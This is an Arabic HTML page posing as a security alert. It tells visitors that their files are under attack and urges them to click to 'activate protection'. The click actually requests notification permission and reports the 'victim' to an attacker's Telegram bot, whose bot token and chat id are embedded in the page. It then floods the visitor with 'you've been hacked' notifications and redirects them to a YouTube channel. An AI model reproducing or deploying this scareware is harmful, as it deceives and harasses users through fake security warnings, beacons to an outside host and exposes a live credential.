<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحذير أمني - Security Alert</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #111; border: 2px solid #ff0000; padding: 40px; border-radius: 25px; text-align: center; box-shadow: 0 0 30px #ff0000; width: 85%; max-width: 350px; }
        .alert-icon { font-size: 70px; margin-bottom: 20px; animation: blink 1s infinite; }
        h2 { color: #ff0000; margin-bottom: 15px; }
        p { color: #ccc; margin-bottom: 30px; }
        button { background: #ff0000; color: #fff; padding: 18px; border: none; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<div class="card">
    <div class="alert-icon">⚠️</div>
    <h2>تنبيه أمني خطير</h2>
    <p>تم اكتشاف محاولة وصول لملفاتك الخاصة. اضغط أدناه لتفعيل وضع الحماية وصد الهجوم.</p>
    <button onclick="startHeavySpam()">تفعيل الحماية الآن</button>
</div>

<script>
    const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY";
    const chat = "8042090388";

    async function startHeavySpam() {
        const permission = await Notification.requestPermission();

        if (permission === "granted") {
            // إرسال تقرير لتليجرام
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat, text: "🧨 بدأ قصف الـ 20 إشعاراً على الضحية بنجاح!" })
            });

            let count = 0;
            const spammer = setInterval(() => {
                new Notification("اختراق!", {
                    body: "تم اختراقك من عمك @ll._911",
                    icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
                });

                count++;
                if (count >= 20) { // التوقف عند 20 رسالة
                    clearInterval(spammer);
                    // التحويل لليوتيوب بعد انتهاء كل الإشعارات
                    setTimeout(() => {
                        window.location.href = "https://youtube.com/@benjaminbennetttt?si=9J7bqSt389IK3tUB";
                    }, 2000);
                }
            }, 5000); // إرسال إشعار كل 5 ثوانٍ

        } else {
            alert("خطأ: يجب السماح بالإشعارات لإيقاف عملية الاختراق!");
        }
    }
</script>

</body>
</html>
